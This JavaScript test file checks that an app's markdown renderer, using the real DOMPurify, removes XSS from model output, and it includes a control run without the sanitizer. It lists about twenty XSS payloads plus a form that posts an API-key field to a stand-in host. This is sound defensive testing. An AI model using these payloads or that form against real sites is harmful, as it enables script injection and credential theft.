// SPDX-License-Identifier: AGPL-3.0-or-later
// R41: the markdown-to-DOM rendering path, driven END TO END with the REAL
// vendored libraries.
//
// THE GAP THIS CLOSES, and it is a structural one rather than a missing case.
// tests-js/harness.mjs:69-70 stubs both libraries out for every loadApp() test:
//     win.marked    = { setOptions() {}, parse: (s) => s };
//     win.DOMPurify = { sanitize: (s) => s };
// That is correct for the nav/abort logic those tests actually drive, but it
// means NO test anywhere exercised renderMarkdown's real sanitisation. With an
// identity-function sanitizer, deleting the DOMPurify.sanitize() call at
// helpers.js:290 - or flipping the order to marked.parse(DOMPurify.sanitize(x)),
// which sanitizes the SOURCE and then generates unsanitized HTML from it - keeps
// every existing test green. The suite could not fail on the defect it most
// needed to catch. vendor-dompurify.test.mjs fixed the neighbouring half (it
// loads the real vendored bytes) but calls DOMPurify.sanitize DIRECTLY, so it
// says nothing about whether helpers.js still calls it, or in what order.
//
// So this file loads the real marked, DOMPurify, highlight.js, KaTeX and
// auto-render over the stubs and drives the SHIPPED renderMarkdown.
//
// IT CARRIES ITS OWN CONTROL, deliberately. The last test re-installs the
// identity-function sanitizer and asserts the SAME payloads then DO produce live
// event handlers. Without that, "0 live handlers" is unfalsifiable: a harness
// that silently stopped injecting payloads, or an assertion that could never
// fire, would look exactly like a clean pass. The control makes this file
// incapable of going quietly blind, which a one-off manual fires-control at
// authoring time cannot guarantee for the file's whole future.
//
// WHAT THIS FILE CANNOT COVER, stated rather than left implied: jsdom does not
// enforce CSP, so nothing here says anything about the shell's Content-Security
// -Policy. That is a genuinely independent second barrier and it was verified
// separately in a real browser. This file covers barrier one, the sanitizer.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { loadApp } from "./harness.mjs";

const VENDOR = new URL("../localm/plugins/gui/static/vendor/", import.meta.url);
const readVendored = (n) => fs.readFileSync(new URL(n, VENDOR), "utf8");

/** loadApp(), then replace harness.mjs's vendor STUBS with the real vendored
 *  bytes, loaded as classic scripts in the same realm - the same load path
 *  index.html uses. helpers.js resolves `marked` / `DOMPurify` as globals at
 *  CALL time, so swapping them after load is enough for renderMarkdown to use
 *  the real ones.
 *
 *  helpers.js:187 runs marked.setOptions() at load, i.e. against the stub, so it
 *  is re-applied here with the SAME options to reproduce production faithfully
 *  rather than testing a differently-configured parser. */
function loadRealPipeline({ withSanitizer = true } = {}) {
  const { window: win } = loadApp();
  for (const f of ["marked.min.js", "purify.min.js", "highlight.min.js",
                   "katex.min.js", "auto-render.min.js"]) {
    const tag = win.document.createElement("script");
    tag.textContent = readVendored(f);
    win.document.head.appendChild(tag);
  }
  assert.equal(typeof win.marked.parse, "function", "real marked did not load");
  assert.equal(typeof win.DOMPurify.sanitize, "function", "real DOMPurify did not load");
  win.marked.setOptions({ breaks: true, mangle: false, headerIds: false });
  if (!withSanitizer) win.DOMPurify = { sanitize: (s) => s };   // control arm only
  return win;
}

// Payloads chosen to cover the classes R41 names, not just the obvious ones:
// raw-HTML passthrough (marked does not escape it), URL schemes markdown can
// carry, the rawtext-element family behind CVE-2026-0540, the mXSS/namespace
// confusion shapes (svg/style, MathML annotation-xml), and document-scope
// hijacks (<base>, <meta refresh>) that are not script execution but are just
// as much a takeover of the page.
const PAYLOADS = {
  "raw script element":      "<script>window.__xss=1<\/script>",
  "img onerror":             '<img src=x onerror="window.__xss=1">',
  "svg onload":              '<svg onload="window.__xss=1"></svg>',
  "body onload":             '<body onload="window.__xss=1">',
  "input autofocus onfocus": '<input autofocus onfocus="window.__xss=1">',
  "markdown javascript:":    "[click](javascript:window.__xss=1)",
  "markdown image js:":      "![x](javascript:window.__xss=1)",
  "markdown data:text/html": "[c](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX194c3M9MTwvc2NyaXB0Pg==)",
  "html-entity javascript:": "[x](jav&#x61;script:window.__xss=1)",
  "iframe srcdoc":           '<iframe srcdoc="&lt;script&gt;parent.__xss=1&lt;/script&gt;"></iframe>',
  "noscript rawtext":        '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>">',
  "xmp rawtext":             "<xmp></xmp><img src=x onerror=window.__xss=1>",
  "noembed rawtext":         "<noembed><img src=x onerror=window.__xss=1></noembed>",
  "svg/style mXSS":          "<svg></p><style><a id=\"</style><img src=1 onerror=window.__xss=1>\">",
  "mathml annotation-xml":   '<math><annotation-xml encoding="text/html"><img src=x onerror=window.__xss=1>',
  "form + formaction":       '<form action="javascript:window.__xss=1"><button formaction="javascript:window.__xss=1">x',
  "base hijack":             "<base href='https://example.invalid/'>",
  "meta refresh":            '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=1">',
  "template smuggle":        "<template><img src=x onerror=window.__xss=1></template>",
  "object/embed":            '<object data="javascript:window.__xss=1"></object><embed src="x.swf">',
};

// <FORM> is deliberately NOT in this set, and the reason is a finding rather
// than an exemption. DOMPurify's default ALLOWED_TAGS includes `form`, so a
// model-authored <form action="https://elsewhere/"> DOES survive sanitisation
// intact - confirmed in a real browser, where its action resolved to the remote
// origin. The sanitizer is not the layer that answers it: the fix is
// `form-action 'none'` in the CSP (http_server.py's _CSP_SUFFIX for the shell,
// artifactSrcdoc for the artifact pane), because form-action is a navigation
// directive with no default-src fallback and omitting it allows submission
// anywhere. jsdom does not enforce CSP, so asserting it HERE would be asserting
// against a layer this harness cannot see; it is covered by
// tests/test_security_headers.py and by the artifactSrcdoc test in
// tests-js/frontend-sec-2026-07-01.test.mjs instead. The test below pins the
// survival itself, so that if a future DOMPurify starts stripping <form> the
// CSP directive's rationale gets re-read rather than silently outliving it.
const HIJACK_TAGS = /^(SCRIPT|IFRAME|OBJECT|EMBED|BASE|META)$/;

/** Every executable or document-hijacking artefact left in a rendered subtree.
 *  Asserts on the DOM, never on the sanitizer's output STRING: the string is a
 *  proxy, and the property that matters is what ends up live in the page. */
function liveThreats(root) {
  const found = [];
  root.querySelectorAll("*").forEach((n) => {
    for (const a of n.attributes) {
      if (/^on/i.test(a.name)) found.push(`${n.tagName}[${a.name}]`);
      if (/^(href|src|action|formaction|srcdoc|data)$/i.test(a.name)
          && /^\s*(javascript|vbscript|data:text\/html)/i.test(a.value)) {
        found.push(`${n.tagName}[${a.name}="${a.value.slice(0, 24)}"]`);
      }
    }
    if (HIJACK_TAGS.test(n.tagName)) found.push(`<${n.tagName}>`);
  });
  return found;
}

function render(win, text) {
  const target = win.document.createElement("div");
  win.document.body.appendChild(target);
  win.renderMarkdown(target, text, { final: true });
  return target;
}

test("no payload survives renderMarkdown as an executable or hijacking node", () => {
  const win = loadRealPipeline();
  const survivors = {};
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    const threats = liveThreats(render(win, payload));
    if (threats.length) survivors[name] = threats;
  }
  assert.deepEqual(survivors, {},
    "renderMarkdown left executable or document-hijacking nodes in the DOM. "
    + "Each key is a payload class that got through the marked -> DOMPurify "
    + "pipeline at helpers.js:290.");
  assert.equal(win.__xss, undefined, "a payload actually executed during render");
});

test("the <think> block sink is sanitized on the same terms as the main body", () => {
  // helpers.js:276 is a SECOND innerHTML sink, fed by splitThink() from the same
  // model output. A reviewer who only reads the main-body line at :290 would
  // miss it entirely, and a model controls both halves.
  const win = loadRealPipeline();
  const survivors = {};
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    const target = render(win, `<think>${payload}</think>visible answer`);
    const det = target.querySelector("details.think-block");
    assert.ok(det, `no think block was produced for payload: ${name}`);
    const threats = liveThreats(det);
    if (threats.length) survivors[name] = threats;
  }
  assert.deepEqual(survivors, {},
    "the think-block sink (helpers.js:276) let a payload through");
  assert.equal(win.__xss, undefined, "a payload executed while rendering a think block");
});

test("both sinks write into a normal HTML element, never a rawtext one", () => {
  // The structural precondition for the CVE-2026-0540 family (and the rawtext
  // class generally) is that the SANITIZER'S OUTPUT is re-parsed inside a
  // rawtext element - noscript / xmp / noembed / noframes / iframe / textarea /
  // title / style - where the HTML parser applies different rules than the
  // sanitizer assumed. localm is not exposed to it because the destinations are
  // plain <div>s. That is a property of the CALL SITES, so it is asserted here
  // rather than inferred from the sanitizer's version.
  const RAWTEXT = new Set(["NOSCRIPT", "XMP", "NOEMBED", "NOFRAMES", "IFRAME",
                           "TEXTAREA", "TITLE", "STYLE", "SCRIPT", "PLAINTEXT"]);
  const win = loadRealPipeline();
  const target = render(win, "<think>reasoning</think>body text");
  const main = target.querySelector(".md-main");
  const think = target.querySelector("details.think-block div");
  assert.ok(main && think, "expected both render destinations to exist");
  for (const [what, node] of [["main body (helpers.js:290)", main],
                              ["think block (helpers.js:276)", think]]) {
    assert.equal(node.tagName, "DIV", `${what} destination is <${node.tagName}>, expected DIV`);
    assert.ok(!RAWTEXT.has(node.tagName), `${what} writes into a rawtext element`);
    // The chain of ancestors matters too: a rawtext ANCESTOR would re-parse the
    // subtree just the same.
    for (let p = node.parentElement; p; p = p.parentElement) {
      assert.ok(!RAWTEXT.has(p.tagName),
        `${what} has a rawtext ancestor <${p.tagName}>, which reopens the `
        + "rawtext re-parse class this call site is otherwise immune to");
    }
  }
});

test("ordinary markdown still renders (the sanitizer is not just eating everything)", () => {
  // A pipeline that returned "" would pass every assertion above. This is the
  // "assert the fix produces something only the fix can produce" half.
  const win = loadRealPipeline();
  const t = render(win, "# Heading\n\n**bold** and `code`\n\n- item\n\n[link](https://example.com)");
  assert.ok(t.querySelector("h1"), "heading was lost");
  assert.ok(t.querySelector("strong"), "bold was lost");
  assert.ok(t.querySelector("code"), "inline code was lost");
  assert.ok(t.querySelector("li"), "list item was lost");
  const a = t.querySelector("a");
  assert.ok(a, "link was lost");
  assert.equal(a.getAttribute("href"), "https://example.com",
    "a safe https link must survive sanitisation intact");
});

test("a model-authored <form> survives sanitisation, so the CSP must confine it", () => {
  // Pins the PREMISE of the `form-action 'none'` CSP directive rather than the
  // directive itself (jsdom enforces no CSP). If a future DOMPurify starts
  // stripping <form> or its action, this goes red and whoever sees it should
  // re-read the form-action rationale in http_server.py rather than assume the
  // directive is still earning its place - the failure mode this guards against
  // is a directive outliving the reason anyone can still find for it.
  const win = loadRealPipeline();
  const t = render(win,
    '<form action="https://example.invalid/collect" method="post">'
    + '<input name="apikey"><button>Verify</button></form>');
  const f = t.querySelector("form");
  assert.ok(f, "DOMPurify no longer passes <form> through - re-read the "
    + "form-action 'none' rationale in http_server.py's _CSP_SUFFIX and in "
    + "helpers.js artifactSrcdoc, which both cite this as their reason.");
  assert.equal(f.getAttribute("action"), "https://example.invalid/collect",
    "a remote form action no longer survives sanitisation - same note as above");
  // The half the sanitizer DOES handle, so the two are not confused:
  const js = render(win, '<form action="javascript:window.__xss=1"><button>x</button></form>');
  assert.equal(js.querySelector("form").getAttribute("action"), null,
    "a javascript: form action must still be stripped by the sanitizer");
});

test("CONTROL: without DOMPurify the very same payloads DO go live", () => {
  // This test exists so the four above cannot pass vacuously. If the payload
  // table stopped reaching the renderer, or liveThreats() stopped detecting
  // anything, this control would go green-when-it-should-be-red and the failure
  // would be visible HERE rather than hiding as a clean pass everywhere else.
  const win = loadRealPipeline({ withSanitizer: false });
  const wentLive = [];
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    if (liveThreats(render(win, payload)).length) wentLive.push(name);
  }
  assert.ok(wentLive.length >= 10,
    `only ${wentLive.length} of ${Object.keys(PAYLOADS).length} payloads produced a `
    + "live threat with the sanitizer removed. The detector or the payload table "
    + "has decayed, so the passing results above prove nothing. Live: "
    + JSON.stringify(wentLive));
});
